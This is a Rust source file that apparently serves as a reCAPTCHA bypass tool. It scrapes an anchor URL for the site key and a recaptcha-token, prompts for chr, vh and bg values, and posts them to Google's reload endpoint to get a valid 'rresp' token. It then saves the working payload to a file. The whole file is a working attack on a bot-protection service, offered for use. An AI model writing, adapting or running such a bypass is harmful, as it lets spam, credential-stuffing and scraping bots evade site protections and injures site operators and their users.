use std::{
    fs::File,
    io::{stdout, Write},
};

use percent_encoding::{utf8_percent_encode, NON_ALPHANUMERIC};
use reqwest::Response;

#[inline]
fn input(s: Option<&str>) -> String {
    if let Some(s) = s {
        print!("{}", s);
        stdout().flush().unwrap();
    }
    let mut buf = String::new();
    std::io::stdin().read_line(&mut buf).unwrap();
    buf.trim().to_string()
}

async fn get_token2(req: Response) -> anyhow::Result<String> {
    let r2 = req.text().await?;
    let token2 = r2
        .split(r#""rresp",""#)
        .collect::<Vec<&str>>()
        .get(1)
        .ok_or(anyhow::anyhow!("Token not found"))?
        .split('"')
        .collect::<Vec<&str>>();
    let token2 = token2.get(0).ok_or(anyhow::anyhow!("Token not found"))?;
    Ok(token2.to_string())
}

#[tokio::main]
async fn main() {
    let anchorr = input(Some("Anchor URL: "));
    let anchorr = anchorr.trim();
    let keysite = anchorr.split("k=").collect::<Vec<&str>>()[1]
        .split('&')
        .collect::<Vec<&str>>()[0];
    let var_co = anchorr.split("co=").collect::<Vec<&str>>()[1]
        .split('&')
        .collect::<Vec<&str>>()[0];
    let var_v = anchorr.split("v=").collect::<Vec<&str>>()[1]
        .split('&')
        .collect::<Vec<&str>>()[0];

    let client = reqwest::Client::new();

    let r1 = client
        .get(anchorr)
        .send()
        .await
        .unwrap()
        .text()
        .await
        .unwrap();

    let token1 = r1
        .split(r#"recaptcha-token" value=""#)
        .collect::<Vec<&str>>()[1]
        .split("\">")
        .collect::<Vec<&str>>()[0];

    let var_chr = input(Some("CHR ([xx, xx, xx]): "));
    let var_vh = input(Some("VH: "));
    let var_bg = input(Some("BG: "));
    let var_chr = utf8_percent_encode(&var_chr, NON_ALPHANUMERIC).to_string();
    println!("\n\nBypassing Recaptcha...");

    let payload = form_urlencoded::Serializer::new(String::new())
        .append_pair("v", var_v)
        .append_pair("reason", "q")
        .append_pair("c", token1)
        .append_pair("k", keysite)
        .append_pair("co", var_co)
        .append_pair("hl", "en")
        .append_pair("size", "invisible")
        .append_pair("chr", &var_chr)
        .append_pair("vh", &var_vh)
        .append_pair("bg", &var_bg)
        .finish();

    let r2 = client
        .post(format!(
            "https://www.google.com/recaptcha/api2/reload?k={}",
            keysite
        ))
        .body(payload)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .send()
        .await;

    let token2 = if let Ok(r2) = r2 {
            get_token2(r2).await
        } else {
            Err(anyhow::anyhow!("Failed to get response"))
        };

    if let Ok(token2) = token2 {
        println!("Recaptcha bypassed: {}", token2);
        let mut file = File::create("bypassed.txt").expect("File not found");
        writeln!(file, "RECAPTCHA BYPASSED\n\n\n\nAnchor: {}\n\n\nReload: https://www.google.com/recaptcha/api2/reload?k={}\n\nPayload : v={}&reason=q&c=<token>&k={}&co={}&hl=en&size=invisible&chr={}&vh={}&bg={}", 
        anchorr, keysite, var_v, keysite, var_co, var_chr, var_vh, var_bg).expect("Unable to write to file");
    } else {
        println!("Recaptcha not vulnerable");
        println!("Error: {:?}", token2.err().unwrap());
    }
}
